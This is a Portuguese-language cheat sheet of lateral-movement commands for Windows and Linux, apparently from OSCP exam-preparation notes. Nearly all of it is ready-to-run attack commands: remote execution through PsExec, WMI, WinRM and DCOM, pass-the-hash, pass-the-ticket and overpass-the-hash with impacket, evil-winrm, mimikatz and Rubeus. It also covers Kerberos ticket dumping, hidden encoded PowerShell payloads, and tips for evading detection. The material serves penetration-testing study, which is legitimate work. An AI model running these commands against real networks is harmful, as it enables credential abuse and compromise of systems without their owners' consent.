# Movimento Lateral

## Índice

- [Movimento Lateral no Windows](#movimento-lateral-no-windows)
  - [PsExec](#psexec)
  - [WMI](#wmi)
  - [WinRM](#winrm)
  - [DCOM](#dcom)
  - [Pass the Hash (PtH)](#pass-the-hash-pth)
  - [Pass the Ticket (PtT)](#pass-the-ticket-ptt)
  - [Overpass the Hash](#overpass-the-hash)
- [Movimento Lateral no Linux](#movimento-lateral-no-linux)
  - [SSH](#ssh)
- [Port Forwarding & Pivoting](#port-forwarding--pivoting)

---

## Movimento Lateral no Windows

### Verificação Rápida (One-liner)

```shell
# Teste rápido de movimento lateral com múltiplas ferramentas
impacket-psexec $domain/$user:$pass@$rhost && evil-winrm -i $rhost -u $user -p $pass
```

### PsExec

#### Sysinternals PsExec

```cmd
.\PsExec64.exe -i \\$rhost -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
.\PsExec64.exe \\$rhost cmd
```

#### Impacket PsExec

```shell
# Com senha (sem domínio)
impacket-psexec "user:password@$rhost"

# Com domínio
impacket-psexec $domain/user:password@$rhost

# Pass-the-Hash
impacket-psexec $domain/Administrator@$rhost -hashes :<NTLM_HASH>
impacket-psexec -hashes :NTLM_HASH Administrator@$rhost

# Interativo
impacket-psexec <USERNAME>@$rhost
```

---

### WMI

#### Windows Management Instrumentation

```cmd
wmic /node:$rhost /user:<USERNAME> /password:<PASSWORD> process call create "cmd"
```

#### PowerShell WMI

```powershell
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $rhost -Credential $credential -SessionOption $Options 
$command = 'cmd /c whoami';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

#### Impacket WMIExec

```shell
impacket-wmiexec $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@$rhost
```

---

### WinRM

#### Windows Remote Shell

```cmd
winrs -r:$rhost -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
winrs -r:$rhost -u:<USERNAME> -p:<PASSWORD> "powershell -ep bypass -c whoami"
```

#### PowerShell Remoting

```powershell
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName $rhost -Credential $credential
Enter-PSSession 1
```

#### Evil-WinRM

```shell
evil-winrm -i $rhost -u <USERNAME> -p <PASSWORD>
evil-winrm -i $rhost -u <USERNAME> -H <NTLM_HASH>
evil-winrm -i $rhost -c certificate.crt -k key.key -S
```

---

### DCOM

#### Distributed Component Object Model

> Objetos DCOM que executam comandos remotamente

| Objeto | ProgID | Observações |
|--------|--------|-------------|
| MMC20 | `MMC20.Application` | Mais comum, requer admin |
| ShellWindows | `ShellWindows` | Método alternativo |
| ShellBrowserWindow | `ShellBrowserWindow` | Apenas workstations |
| Excel | `Excel.Application` | Se Office instalado |
| Outlook | `Outlook.Application` | Se Outlook instalado |

```powershell
# Método MMC20.Application
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$rhost"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_PAYLOAD>","7")

# Método ShellWindows
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}","$rhost"))
$dcom.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)

# Método ShellBrowserWindow
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}","$rhost"))
$dcom.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)

# Execução de macro via Excel
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","$rhost"))
$dcom.DisplayAlerts = $false
$workbook = $dcom.Workbooks.Add()
$dcom.Run("Shell cmd.exe /c powershell -e <BASE64>")
```

#### Impacket DCOMExec

```shell
impacket-dcomexec $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-dcomexec -object MMC20 -silentcommand $domain/<USERNAME>:<PASSWORD>@$rhost '<COMANDO>'

# Com hash
impacket-dcomexec -hashes :<NTLM_HASH> -object MMC20 $domain/Administrator@$rhost

# Objetos alternativos
impacket-dcomexec -object ShellWindows $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-dcomexec -object ShellBrowserWindow $domain/<USERNAME>:<PASSWORD>@$rhost
```

---

### Pass the Hash (PtH)

> Usar hash NTLM para autenticação sem senha em texto claro

#### Impacket

```shell
impacket-psexec -hashes :<NTLM_HASH> Administrator@$rhost
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@$rhost
impacket-smbexec -hashes :<NTLM_HASH> Administrator@$rhost
```

#### NetExec

```shell
nxc smb $rhost -u Administrator -H <NTLM_HASH>
nxc smb $rhost -u Administrator -H <NTLM_HASH> -x "whoami"
nxc winrm $rhost -u Administrator -H <NTLM_HASH>
```

#### Evil-WinRM (PtH)

```shell
evil-winrm -i $rhost -u Administrator -H <NTLM_HASH>
```

---

### Pass the Ticket (PtT)

> Usar ticket Kerberos para autenticação (requer arquivo .kirbi ou .ccache)

#### Exportar Tickets (mimikatz)

```cmd
sekurlsa::tickets /export
dir *.kirbi
```

#### Injetar Ticket (mimikatz)

```cmd
kerberos::ptt <TICKET>.kirbi

# Listar tickets em cache
kerberos::list
klist
```

#### Injetar Ticket (Rubeus)

```cmd
.\Rubeus.exe ptt /ticket:<TICKET>.kirbi
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>

# Criar processo sacrificial e injetar
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /luid:<LUID> /ticket:<TICKET>.kirbi
```

#### Converter Formatos de Ticket

```shell
# Converter .kirbi para .ccache (uso no Linux)
impacket-ticketConverter ticket.kirbi ticket.ccache

# Converter .ccache para .kirbi (uso no Windows)
impacket-ticketConverter ticket.ccache ticket.kirbi
```

#### PtT no Linux

```shell
export KRB5CCNAME=<USERNAME>.ccache
impacket-psexec $domain/<USERNAME>@$rhost -k -no-pass
impacket-wmiexec $domain/<USERNAME>@$rhost -k -no-pass
impacket-smbexec $domain/<USERNAME>@$rhost -k -no-pass
evil-winrm -i $rhost -r $domain
```

---

### Overpass the Hash

> Usar hash NTLM para solicitar TGT Kerberos e usar o ticket para autenticação.
> Útil quando autenticação NTLM está bloqueada mas Kerberos está permitido.

#### mimikatz

```cmd
# Criar novo processo com ticket injetado
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell

# Com chave AES256 (mais furtivo)
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:powershell
```

#### Rubeus

```cmd
# Solicitar TGT usando hash NTLM
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt

# Com AES256 (mais furtivo, evita detecção RC4)
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_KEY> /ptt /opsec

# Criar sessão logon sacrificial
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt /luid:<LUID>
```

#### Impacket (Overpass)

```shell
impacket-getTGT $domain/<USERNAME> -hashes :<NTLM_HASH>
export KRB5CCNAME=<USERNAME>.ccache
impacket-psexec $domain/<USERNAME>@$rhost -k -no-pass

# Com chave AES
impacket-getTGT $domain/<USERNAME> -aesKey <AES256_KEY>
```

#### NetExec com Kerberos

```shell
# Após exportar o ticket
export KRB5CCNAME=<USERNAME>.ccache
nxc smb $rhost -k --use-kcache
nxc smb $rhost -k --use-kcache -x "whoami"
```

---

## Movimento Lateral no Linux

### SSH

```shell
ssh <USERNAME>@$rhost
ssh -i id_rsa <USERNAME>@$rhost
ssh -o StrictHostKeyChecking=no <USERNAME>@$rhost
```

#### SSH com Senha

```shell
sshpass -p '<PASSWORD>' ssh <USERNAME>@$rhost
```

---

## Port Forwarding & Pivoting

> Para técnicas detalhadas de port forwarding, pivoting e tunneling (Chisel, Ligolo-ng, SSH Tunneling, Socat, ProxyChains, sshuttle, Metasploit Pivoting), veja:
>
> **[Cheatsheet de Pivoting & Tunneling](Pivoting-Tunneling.md)**

---

## Veja Também

### Arquivos AD Relacionados

- **[Exploração de AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** - Abuso de ACL, GPO, AD CS
- **[Ataques de Senha](../3.AD-Exploit/3.2.Password-Attacks.md)** - Quebra de hash, extração de credenciais
- **[Ataques Kerberos](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Golden/Silver Tickets, DCSync, Delegation
- **[NTLM Relay & Responder](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder, NTLM Relay, detalhes PtH

### Pivoting & Tunneling

- **[Pivoting & Tunneling](Pivoting-Tunneling.md)** - Chisel, ProxyChains, SSH Tunnels
- **[Guia Completo Ligolo-ng](Ligolo-ng-Complete-Guide.md)** - Pivoting single/multi-hop

### Escalação de Privilégios

- **[Escalação de Privilégios Windows](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Escalar antes de pivotar
- **[Escalação de Privilégios Linux](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Técnicas de privesc no Linux

### Preparação OSCP

- **[Guia do Exame OSCP](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** - Metodologia completa do exame
